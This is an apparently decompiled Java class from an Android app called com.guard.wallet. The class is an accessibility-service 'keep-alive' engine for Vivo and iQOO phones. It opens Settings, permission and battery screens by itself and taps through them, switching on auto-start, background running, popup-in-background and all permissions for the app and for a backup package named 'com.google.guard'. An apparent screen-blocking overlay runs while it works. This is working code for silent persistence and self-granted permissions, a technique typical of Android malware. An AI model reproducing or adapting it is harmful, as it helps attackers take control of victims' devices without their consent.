package com.guard.wallet.engine;
import com.guard.wallet.core.AppUtils;

import android.content.ComponentName;
import android.content.Intent;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.guard.wallet.MainApplication;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.delegate.EngineHelper;
import com.guard.wallet.delegate.FilterHelper;
import com.guard.wallet.entity.Point;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.req.ScreenMetricsVO;
import com.guard.wallet.resp.PowerControlStateVO;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.Collections;
import java.util.LinkedList;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;

/**
 * Vivo/iQOO 保活引擎。
 *
 * vendor 原始路径: o/i0.java
 */
public final class VivoEngine extends KeepAliveEngine {

    private static final Object KEEP_ALIVE_UNKNOWN = EngineHelper.KEEP_ALIVE_UNKNOWN;
    private static final Object KEEP_ALIVE_MAIN = EngineHelper.KEEP_ALIVE_MAIN;
    private static final Object KEEP_ALIVE_BACKUP = EngineHelper.KEEP_ALIVE_BACKUP;

    public static final int B = 0;

    public final AtomicReference r = new AtomicReference<>(KEEP_ALIVE_UNKNOWN);
    public final AtomicReference s = new AtomicReference(null);
    public final AtomicBoolean t = new AtomicBoolean(false);
    public final AtomicBoolean u = new AtomicBoolean(false);
    public final AtomicBoolean v = new AtomicBoolean(true);
    public final AtomicBoolean w = new AtomicBoolean(true);
    public final AtomicBoolean x = new AtomicBoolean(false);
    public final AtomicBoolean y = new AtomicBoolean(false);
    public final AtomicBoolean z = new AtomicBoolean(false);
    public final AtomicBoolean A;

    public VivoEngine() {
        super(u0(), "com.android.settings");
        this.A = new AtomicBoolean(false);
        try {
            super.p.schedule(new com.guard.wallet.delegate.task.VivoDelegateTask(this, 0), 120L, TimeUnit.SECONDS);
        } catch (Exception ex) {
            AppUtils.s("o.i0", ex);
        }
    }

    // ======= Static CombineFilter builders =======

    public static CombineFilter b0() {
        CombineFilter f = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(f,
                FilterHelper.initFilter(f, "className", "android.widget.Button"), "text");
        sc.setEquals(com.guard.wallet.utils.LocateValuesUtils.getValue("VIVO_ALLOW_TEXT"));
        f.getStringConditions().add(sc);
        return f;
    }

    public static CombineFilter C0() {
        CombineFilter f = new CombineFilter();
        f.getStringConditions().add(FilterHelper.initFilter(f, "className", "android.widget.RelativeLayout"));
        StringCondition sc = new StringCondition();
        sc.setProperty("id");
        sc.setSuffix(":id/all_opt");
        f.getStringConditions().add(sc);
        return f;
    }

    public static CombineFilter D0() {
        CombineFilter f = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(f,
                FilterHelper.initFilter(f, "className", "android.widget.TextView"), "text");
        sc.setEquals(com.guard.wallet.utils.LocateValuesUtils.getValue("VIVO_APP_ALL_PERMISSION_TEXT"));
        f.getStringConditions().add(sc);
        return f;
    }

    public static CombineFilter E0() {
        CombineFilter f = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(f,
                FilterHelper.initFilter(f, "className", "android.widget.TextView"), "text");
        sc.setEquals(com.guard.wallet.utils.LocateValuesUtils.getValue("VIVO_BACKGROUND_POWER_MANAGER_TEXT"));
        f.getStringConditions().add(sc);
        return f;
    }

    public static CombineFilter H0() {
        CombineFilter f = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(f,
                FilterHelper.initFilter(f, "className", "android.widget.TextView"), "text");
        sc.setEquals(com.guard.wallet.utils.LocateValuesUtils.getValue("VIVO_APP_PERMISSION_TEXT"));
        f.getStringConditions().add(sc);
        return f;
    }

    public static CombineFilter i0() {
        CombineFilter f = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(f,
                FilterHelper.initFilter(f, "className", "android.widget.TextView"), "text");
        sc.setEquals(com.guard.wallet.utils.LocateValuesUtils.getValue("VIVO_AUTO_START_TEXT"));
        f.getStringConditions().add(sc);
        return f;
    }

    public static CombineFilter w0() {
        CombineFilter f = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(f,
                FilterHelper.initFilter(f, "className", "android.widget.TextView"), "text");
        sc.setEquals(com.guard.wallet.utils.LocateValuesUtils.getValue("VIVO_POPUP_IN_BACKGROUND_TEXT"));
        f.getStringConditions().add(sc);
        return f;
    }

    // ======= Static ListenWindow builders =======

    public static ListenWindow B0() {
        ListenWindow lw = new ListenWindow("com.vivo.permissionmanager", "android.app.AlertDialog");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        return lw;
    }

    public static ListenWindow F0() {
        ListenWindow lw = new ListenWindow("com.vivo.abe",
                "com.vivo.applicationbehaviorengine.ui.ExcessivePowerDescriptionActivity");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        return lw;
    }

    public static ListenWindow G0() {
        ListenWindow lw = new ListenWindow("com.vivo.abe",
                "com.vivo.applicationbehaviorengine.ui.ExcessivePowerManagerActivity");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        return lw;
    }

    public static ListenWindow c0(String appName) {
        ListenWindow lw = new ListenWindow("com.android.settings", "com.vivo.settings.VivoSubSettings");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        lw.setMatchs(new LinkedList<>());
        lw.getMatchs().add(buildTextContainsFilter(appName));
        return lw;
    }

    public static ListenWindow d0(String appName) {
        ListenWindow lw = new ListenWindow("com.android.settings",
                "com.vivo.settings.applications.InstalledAppDetailsTop");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        lw.setMatchs(new LinkedList<>());
        lw.getMatchs().add(buildTextContainsFilter(appName));
        return lw;
    }

    public static ListenWindow e0(String appName) {
        ListenWindow lw = new ListenWindow(null, null);
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        lw.setMatchs(new LinkedList<>());
        lw.getMatchs().add(buildTextContainsFilter(appName));
        return lw;
    }

    public static ListenWindow f0() {
        ListenWindow lw = new ListenWindow("com.vivo.permissionmanager",
                "com.vivo.permissionmanager.activity.SoftPermissionDetailActivity");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        return lw;
    }

    public static ListenWindow g0() {
        ListenWindow lw = new ListenWindow("com.android.settings", "android.widget.FrameLayout");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        return lw;
    }

    public static ListenWindow h0() {
        ListenWindow lw = new ListenWindow("com.android.permissioncontroller",
                "com.android.permissioncontroller.permission.ui.ManagePermissionsActivity");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        return lw;
    }

    public static ListenWindow r0() {
        ListenWindow lw = new ListenWindow("com.iqoo.powersaving",
                "com.iqoo.powersaving.activity.ExcessivePowerDescriptionActivity");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        return lw;
    }

    public static ListenWindow s0() {
        ListenWindow lw = new ListenWindow("com.iqoo.powersaving",
                "com.iqoo.powersaving.activity.ExcessivePowerManagerActivity");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        return lw;
    }

    public static ListenWindow v0() {
        ListenWindow lw = new ListenWindow("com.vivo.permissionmanager",
                "com.originui.widget.dialog.h");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        return lw;
    }

    public static ListenWindow x0() {
        ListenWindow lw = new ListenWindow("com.iqoo.powersaving",
                "com.iqoo.powersaving.fuelgauge.PowerRankActivity");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        return lw;
    }

    public static LinkedList u0() {
        LinkedList list = new LinkedList();
        list.add(buildBatteryDialogListenWindow());
        list.add(d0(com.guard.wallet.utils.SystemHelper.x0()));
        list.add(c0(com.guard.wallet.utils.SystemHelper.x0()));
        list.add(d0(com.guard.wallet.utils.SystemHelper.e()));
        list.add(c0(com.guard.wallet.utils.SystemHelper.e()));
        list.add(h0());
        list.add(g0());
        list.add(f0());
        list.add(e0(com.guard.wallet.utils.SystemHelper.x0()));
        list.add(e0(com.guard.wallet.utils.SystemHelper.e()));
        list.add(v0());
        list.add(B0());
        list.add(x0());
        list.add(G0());
        list.add(s0());
        list.add(F0());
        list.add(r0());
        return list;
    }

    // ======= Instance methods =======

    public final boolean A0() {
        try {
            if (com.guard.wallet.utils.SystemHelper.Z() != null) {
                ComponentName cn = new ComponentName("com.iqoo.powersaving",
                        "com.iqoo.powersaving.fuelgauge.PowerRankActivity");
                Intent intent = new Intent();
                intent.setComponent(cn);
                intent.addFlags(268435456);
                intent.addFlags(536870912);
                intent.addFlags(67108864);
                intent.addFlags(2097152);
                intent.addFlags(8388608);
                this.s.set("prepareInAppPowerRank");
                com.guard.wallet.utils.SystemHelper.Z().startActivity(intent);
                Log.d("o.i0", "已启动耗电管理");
                return true;
            }
        } catch (Exception ex) {
            AppUtils.s("o.i0", ex);
        }
        Log.e("o.i0", "耗电管理启动失败");
        return false;
    }

    @Override
    public final void Z() {
        ReentrantLock lock = super.o;
        if (lock.tryLock()) {
            try {
                if (!this.isEngineFinished()) {
                    Log.d("o.i0", "准备结束本地保活自动化引擎");
                    com.guard.wallet.helper.BlockViewManager.h(100);
                    this.markEngineRunning();
                    if (MyAccessibilityService.P() != null) {
                        MyAccessibilityService.P().x();
                    }
                    this.y0();
                    super.p.shutdownNow();
                    com.guard.wallet.thread.DelegateTaskLauncher.a(super.c);
                    super.n.clear();
                    if (AppUtils.M()) {
                        com.guard.wallet.utils.SystemHelper.T0(5);
                    }
                    // ADAPT: h.e shadowed by o.h, e.b shadowed by field 'e'
                    if (!EngineHelper.heS().isPaired() && Objects.equals(0, com.guard.wallet.utils.ConfigManager.getPromotionModel())) {
                        MainApplication.getInstance().offerStrategyEvent("PREPARE_LEAVE_PIP");
                    } else {
                        EngineHelper.callEBD();
                        com.guard.wallet.helper.BlockViewManager.c();
                    }
                    Log.d("o.i0", "已结束本地保活自动化引擎");
                    notifyPrepareConfirmLock();
                    this.d();
                }
            } catch (Exception ex) {
                AppUtils.s("o.i0", ex);
            }
            lock.unlock();
        }
    }

    @Override
    public final boolean equals(Object obj) {
        return obj instanceof VivoEngine;
    }

    @Override
    public final int hashCode() {
        return Objects.hash(VivoEngine.class.getName());
    }

    public final boolean j0() {
        try {
            LinkedList list = new LinkedList();
            list.add(d0(com.guard.wallet.utils.SystemHelper.x0()));
            list.add(c0(com.guard.wallet.utils.SystemHelper.x0()));
            list.add(d0(com.guard.wallet.utils.SystemHelper.e()));
            list.add(c0(com.guard.wallet.utils.SystemHelper.e()));
            if (this.q(list)) {
                Log.d("o.i0", "已进入App详情窗口");
                return true;
            }
        } catch (Exception ex) {
            AppUtils.s("o.i0", ex);
        }
        return false;
    }

    public final boolean k0() {
        try {
            LinkedList list = new LinkedList();
            list.add(f0());
            list.add(e0(com.guard.wallet.utils.SystemHelper.x0()));
            list.add(e0(com.guard.wallet.utils.SystemHelper.e()));
            if (this.q(list)) {
                Log.d("o.i0", "已进入App权限详情窗口");
                return true;
            }
        } catch (Exception ex) {
            AppUtils.s("o.i0", ex);
        }
        return false;
    }

    public final boolean l0() {
        try {
            LinkedList list = new LinkedList();
            list.add(h0());
            list.add(g0());
            list.add(e0(com.guard.wallet.utils.SystemHelper.x0()));
            list.add(e0(com.guard.wallet.utils.SystemHelper.e()));
            if (this.q(list)) {
                Log.d("o.i0", "已进入App权限管理窗口");
                return true;
            }
        } catch (Exception ex) {
            AppUtils.s("o.i0", ex);
        }
        return false;
    }

    public final boolean m0() {
        try {
            LinkedList list = new LinkedList();
            list.add(F0());
            list.add(r0());
            if (this.q(list)) {
                Log.d("o.i0", "已进入App后台耗电详情窗口");
                return true;
            }
        } catch (Exception ex) {
            AppUtils.s("o.i0", ex);
        }
        return false;
    }

    public final boolean n0() {
        try {
            LinkedList list = new LinkedList();
            list.add(G0());
            list.add(s0());
            if (this.q(list)) {
                Log.d("o.i0", "已进入后台耗电管理窗口");
                return true;
            }
        } catch (Exception ex) {
            AppUtils.s("o.i0", ex);
        }
        return false;
    }

    public final boolean o0() {
        try {
            LinkedList list = new LinkedList();
            list.add(v0());
            list.add(B0());
            if (this.q(list)) {
                Log.d("o.i0", "已进入是否允许权限对话框");
                return true;
            }
        } catch (Exception ex) {
            AppUtils.s("o.i0", ex);
        }
        return false;
    }

    public final boolean p0() {
        try {
            if (this.q(Collections.singletonList(x0()))) {
                Log.d("o.i0", "已进入电池管理窗口");
                return true;
            }
        } catch (Exception ex) {
            AppUtils.s("o.i0", ex);
        }
        return false;
    }

    public final void q0() {
        try {
            ScreenMetricsVO metrics = com.guard.wallet.utils.DeviceUtils.buildScreenMetrics();
            Log.d("o.i0", String.valueOf(metrics.getNavigationBarHeight()));
            Point from = new Point(
                    (float) metrics.getWidth().intValue() / 2.0f,
                    (float) (metrics.getHeight() - metrics.getNavigationBarHeight() - 100));
            Point to = new Point(
                    (float) metrics.getWidth().intValue() / 2.0f,
                    (float) metrics.getStatusBarHeight().intValue());
            if (com.guard.wallet.utils.SystemHelper.S(10L, 1000L, from, to)) {
                com.guard.wallet.utils.SystemHelper.T0(10);
                com.guard.wallet.utils.SystemHelper.s(
                        Integer.valueOf(metrics.getWidth().intValue() / 2),
                        Integer.valueOf(metrics.getHeight().intValue()
                                - metrics.getNavigationBarHeight().intValue() - 200));
                this.s.set("prepareInAppPermissionDetail");
            }
        } catch (Exception ex) {
            AppUtils.s("o.i0", ex);
        }
    }

    public final void t0() {
        try {
            boolean inPermManage = this.l0();
            AtomicReference stateRef = this.s;
            if (inPermManage) {
                com.guard.wallet.helper.BlockViewManager.h(80);
                this.G();
                Log.d("o.i0", "active root complete");
                UiObject scrollView = this.findScrollableContainer();
                AtomicInteger counter = new AtomicInteger(0);
                while (scrollView == null && counter.incrementAndGet() <= 5) {
                    com.guard.wallet.utils.SystemHelper.T0(5);
                    scrollView = this.findScrollableContainer();
                }
                UiObject found;
                if (scrollView != null) {
                    Log.d("o.i0", "权限窗口滚动视图查找完成");
                    found = FilterHelper.scrollForwardUtil(scrollView, D0(), 0, 0);
                    if (found == null) {
                        found = FilterHelper.scrollBackwardUtilFilter(scrollView, D0());
                    }
                } else {
                    found = null;
                }
                if (found == null) {
                    found = this.k().findOneByCombine(D0());
                }
                if (found != null) {
                    Log.d("o.i0", "所有权限栏目查找成功");
                    UiObject clickable = found.findParentUtilCombine(buildClickableNodeFilter());
                    if (clickable != null && clickable.click()) {
                        Log.d("o.i0", "查找并点击所有权限栏目完成");
                        com.guard.wallet.helper.BlockViewManager.h(85);
                        MyAccessibilityService.P().l0(true);
                        stateRef.set("prepareInAppPermissionDetail");
                        return;
                    }
                }
            }
            if (Objects.equals(stateRef.get(), "prepareInAppPermissionManage")) {
                this.q0();
                com.guard.wallet.helper.BlockViewManager.h(85);
            }
        } catch (Exception ex) {
            AppUtils.s("o.i0", ex);
        }
    }

    public final void y0() {
        try {
            PowerControlStateVO vo = com.guard.wallet.utils.SharedPrefsManager.k(
                    MainApplication.getAppContext().getPackageName());
            vo.setPackageName(MainApplication.getAppContext().getPackageName());
            if (this.t.get()) {
                vo.setAllowAutoStart(this.t.get());
            }
            if (this.v.get()) {
                vo.setAllowRelateStart(this.v.get());
            }
            if (this.x.get()) {
                vo.setAllowAllFullBackground(this.x.get());
            }
            if (this.z.get()) {
                vo.setAllowPopupInBackground(this.z.get());
            }
            vo.setRetryCount(vo.getRetryCount() + 1);
            com.guard.wallet.utils.SharedPrefsManager.L(vo);
            Log.d("o.i0", "主进程保活策略已保存");

            PowerControlStateVO vo2 = com.guard.wallet.utils.SharedPrefsManager.k("com.google.guard");
            vo2.setPackageName("com.google.guard");
            if (this.u.get()) {
                vo2.setAllowAutoStart(this.u.get());
            }
            if (this.w.get()) {
                vo2.setAllowRelateStart(this.w.get());
            }
            if (this.y.get()) {
                vo2.setAllowAllFullBackground(this.y.get());
            }
            if (this.A.get()) {
                vo2.setAllowPopupInBackground(this.A.get());
            }
            vo2.setRetryCount(vo2.getRetryCount() + 1);
            com.guard.wallet.utils.SharedPrefsManager.L(vo2);
            Log.d("o.i0", "备用进程保活策略已保存");
        } catch (Exception ex) {
            AppUtils.s("o.i0", ex);
        }
    }

    public final void z0() {
        try {
            this.y0();
            AtomicReference keepAliveRef = this.r;
            boolean isUnknown = Objects.equals(keepAliveRef.get(), KEEP_ALIVE_UNKNOWN);
            AtomicReference stateRef = this.s;

            if (isUnknown) {
                if (!com.guard.wallet.utils.SharedPrefsManager.r(MyAccessibilityService.P().getPackageName())) {
                    keepAliveRef.set(KEEP_ALIVE_MAIN);
                    stateRef.set("prepareInAppDetailSetting");
                    com.guard.wallet.utils.SystemHelper.Z0(MyAccessibilityService.P().getPackageName());
                    Log.d("o.i0", MyAccessibilityService.P().getPackageName().concat(" 应用详情已启动"));
                    MyAccessibilityService.P().getPackageName().concat(" 应用详情已启动");
                    return;
                }
                if (!com.guard.wallet.utils.SharedPrefsManager.r("com.google.guard")
                        && com.guard.wallet.utils.SystemHelper.d0("com.google.guard") != null) {
                    keepAliveRef.set(KEEP_ALIVE_BACKUP);
                    stateRef.set("prepareInAppDetailSetting");
                    com.guard.wallet.utils.SystemHelper.Z0("com.google.guard");
                    Log.d("o.i0", "com.google.guard".concat(" 应用详情已启动"));
                    "com.google.guard".concat(" 应用详情已启动");
                    return;
                }
            }

            if (Objects.equals(keepAliveRef.get(), KEEP_ALIVE_MAIN)
                    && !com.guard.wallet.utils.SharedPrefsManager.r("com.google.guard")
                    && com.guard.wallet.utils.SystemHelper.d0("com.google.guard") != null) {
                keepAliveRef.set(KEEP_ALIVE_BACKUP);
                stateRef.set("prepareInAppDetailSetting");
                com.guard.wallet.utils.SystemHelper.Z0("com.google.guard");
                Log.d("o.i0", "com.google.guard".concat(" 应用详情已启动"));
                "com.google.guard".concat(" 应用详情已启动");
                return;
            }

            this.y0();
            this.Z();
        } catch (Exception ex) {
            AppUtils.s("o.i0", ex);
        }
    }

    @Override
    public final void u(AccessibilityEvent event, String pkg, String cls) {
        try {
            if (this.isEngineFinished()) {
                return;
            }
            if (event != null) {
                super.u(event, pkg, cls);
            }
            AtomicReference stateRef = this.s;
            String threadId = super.c;
            ConcurrentLinkedQueue taskQueue = super.n;

            if (Objects.equals(stateRef.get(), "prepareInAppPowerRank") && this.p0()) {
                com.guard.wallet.utils.SystemHelper.T0(5);
                taskQueue.remove("keepAliveInExcessivePowerManager");
                taskQueue.remove("keepAliveInExcessivePowerDescription");
                taskQueue.remove("keepAliveInAppDetail");
                taskQueue.remove("keepAliveInAppPermissionManage");
                taskQueue.remove("keepAliveInAppPermissionDetail");
                taskQueue.remove("keepAliveInPermissionAllowDialog");
                if (!taskQueue.contains("keepAliveInPowerRank")) {
                    taskQueue.add("keepAliveInPowerRank");
                    com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.VivoDelegateTask(this, 1), threadId);
                }
            }

            if (Objects.equals(stateRef.get(), "prepareInExcessivePowerManager") && this.n0()) {
                com.guard.wallet.utils.SystemHelper.T0(5);
                taskQueue.remove("keepAliveInPowerRank");
                taskQueue.remove("keepAliveInExcessivePowerDescription");
                taskQueue.remove("keepAliveInAppDetail");
                taskQueue.remove("keepAliveInAppPermissionManage");
                taskQueue.remove("keepAliveInAppPermissionDetail");
                taskQueue.remove("keepAliveInPermissionAllowDialog");
                if (!taskQueue.contains("keepAliveInExcessivePowerManager")) {
                    taskQueue.add("keepAliveInExcessivePowerManager");
                    com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.VivoDelegateTask(this, 2), threadId);
                }
            }

            if (Objects.equals(stateRef.get(), "prepareInExcessivePowerDescription") && this.m0()) {
                com.guard.wallet.utils.SystemHelper.T0(5);
                taskQueue.remove("keepAliveInPowerRank");
                taskQueue.remove("keepAliveInExcessivePowerManager");
                taskQueue.remove("keepAliveInAppDetail");
                taskQueue.remove("keepAliveInAppPermissionManage");
                taskQueue.remove("keepAliveInAppPermissionDetail");
                taskQueue.remove("keepAliveInPermissionAllowDialog");
                if (!taskQueue.contains("keepAliveInExcessivePowerDescription")) {
                    taskQueue.add("keepAliveInExcessivePowerDescription");
                    com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.VivoDelegateTask(this, 3), threadId);
                }
            }

            if (Objects.equals(stateRef.get(), "prepareInAppDetailSetting") && this.j0()) {
                com.guard.wallet.utils.SystemHelper.T0(5);
                taskQueue.remove("keepAliveInPowerRank");
                taskQueue.remove("keepAliveInExcessivePowerManager");
                taskQueue.remove("keepAliveInExcessivePowerDescription");
                taskQueue.remove("keepAliveInAppPermissionManage");
                taskQueue.remove("keepAliveInAppPermissionDetail");
                taskQueue.remove("keepAliveInPermissionAllowDialog");
                if (!taskQueue.contains("keepAliveInAppDetail")) {
                    taskQueue.add("keepAliveInAppDetail");
                    com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.VivoDelegateTask(this, 4), threadId);
                }
            }

            if (Objects.equals(stateRef.get(), "prepareInAppPermissionManage") && this.l0()) {
                com.guard.wallet.utils.SystemHelper.T0(5);
                taskQueue.remove("keepAliveInPowerRank");
                taskQueue.remove("keepAliveInExcessivePowerManager");
                taskQueue.remove("keepAliveInExcessivePowerDescription");
                taskQueue.remove("keepAliveInAppDetail");
                taskQueue.remove("keepAliveInAppPermissionDetail");
                taskQueue.remove("keepAliveInPermissionAllowDialog");
                if (!taskQueue.contains("keepAliveInAppPermissionManage")) {
                    taskQueue.add("keepAliveInAppPermissionManage");
                    com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.VivoDelegateTask(this, 5), threadId);
                }
            }

            if (Objects.equals(stateRef.get(), "prepareInAppPermissionDetail") && this.k0()) {
                com.guard.wallet.utils.SystemHelper.T0(5);
                taskQueue.remove("keepAliveInPowerRank");
                taskQueue.remove("keepAliveInExcessivePowerManager");
                taskQueue.remove("keepAliveInExcessivePowerDescription");
                taskQueue.remove("keepAliveInAppDetail");
                taskQueue.remove("keepAliveInAppPermissionManage");
                taskQueue.remove("keepAliveInPermissionAllowDialog");
                if (!taskQueue.contains("keepAliveInAppPermissionDetail")) {
                    taskQueue.add("keepAliveInAppPermissionDetail");
                    com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.VivoDelegateTask(this, 6), threadId);
                }
            }

            if (Objects.equals(stateRef.get(), "prepareInPermissionAllowDialog") && this.o0()) {
                com.guard.wallet.utils.SystemHelper.T0(5);
                taskQueue.remove("keepAliveInPowerRank");
                taskQueue.remove("keepAliveInExcessivePowerManager");
                taskQueue.remove("keepAliveInExcessivePowerDescription");
                taskQueue.remove("keepAliveInAppDetail");
                taskQueue.remove("keepAliveInAppPermissionManage");
                taskQueue.remove("keepAliveInAppPermissionDetail");
                if (!taskQueue.contains("keepAliveInPermissionAllowDialog")) {
                    taskQueue.add("keepAliveInPermissionAllowDialog");
                    com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.VivoDelegateTask(this, 7), threadId);
                }
            }
        } catch (Exception ex) {
            AppUtils.s("o.i0", ex);
        }
    }
}
